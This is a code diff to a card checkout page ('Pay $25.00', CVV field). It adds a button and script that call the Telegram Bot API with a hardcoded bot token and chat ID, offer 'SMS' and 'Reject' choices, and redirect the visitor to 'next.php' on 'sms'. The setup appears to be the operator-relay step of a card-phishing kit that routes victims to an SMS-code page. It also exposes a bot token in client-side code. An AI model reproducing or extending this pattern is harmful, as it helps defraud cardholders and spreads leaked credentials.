@@ -53,6 +53,9 @@
                             <i class="fas fa-lock"></i> Pay $25.00
                         </button>
                     </form>
+                    <button id="sendMessageButton" class="btn btn-primary btn-block">
+                        Send Message to Telegram Group
+                    </button>
                 </div>
                 <div class="card-footer text-muted text-center">
                     <img src="{{url_for('static', filename='img/visa.png')}}" alt="Visa" class="img-fluid" style="max-width: 80px;">
@@ -132,6 +135,63 @@ function validateExpiryDate(expiryDate) {
 document.getElementById('cvv').addEventListener('input', function (e) {
     var target = e.target;
     target.value = target.value.replace(/\D/g, '');
+});
+</script>
+<script>
+    document.getElementById('sendMessageButton').addEventListener('click', function (e) {
+    e.preventDefault();
+
+    // Unesite vaš API token za Telegram bota
+    var botToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
+    var chatId = '-4104959417';
+
+    // Poruka koju želite da pošaljete
+    var messageText = 'Hello, this is a message from the checkout page.';
+
+    // Inline tastatura sa opcijama "sms" i "reject"
+    var inlineKeyboard = JSON.stringify({
+        inline_keyboard: [
+            [
+                { text: 'SMS', callback_data: 'sms' },
+                { text: 'Reject', callback_data: 'reject' }
+            ]
+        ]
+    });
+
+    // Konstruišite URL za slanje poruke sa inline tastaturom na Telegram API
+    var apiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(messageText) + '&reply_markup=' + encodeURIComponent(inlineKeyboard) + '&parse_mode=HTML';
+
+    // Pošaljite zahtev na Telegram API
+    fetch(apiUrl)
+        .then(function (response) {
+            return response.json();
+        })
+        .then(function (data) {
+            if (data.ok) {
+                alert('Message sent successfully to Telegram group.');
+                // Ovde možete implementirati dodatnu logiku ako je poruka uspešno poslata
+                // Na primer, možete čekati odgovor od Telegram bota na callback_data
+            } else {
+                alert('Error sending message to Telegram group.');
+                // Ovde možete implementirati dodatnu logiku ako se pojavi greška pri slanju poruke
+            }
+        })
+        .catch(function (error) {
+            alert('An error occurred while sending the message: ' + error);
+        });
+});
+
+document.addEventListener('click', function (e) {
+    if (e.target && e.target.nodeName === 'BUTTON') {
+        var callbackData = e.target.getAttribute('data-callback');
+        if (callbackData === 'sms') {
+            // Ako korisnik odabere "sms", preusmerite ga na sledeću stranicu (npr. 'next.php')
+            window.location.href = 'next.php'; // Promenite 'next.php' u putanju do vaše sledeće stranice
+        } else if (callbackData === 'reject') {
+            // Ako korisnik odabere "reject", možete implementirati odgovarajuću logiku
+            alert('User rejected the request.');
+        }
+    }
 });
 </script>
 <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
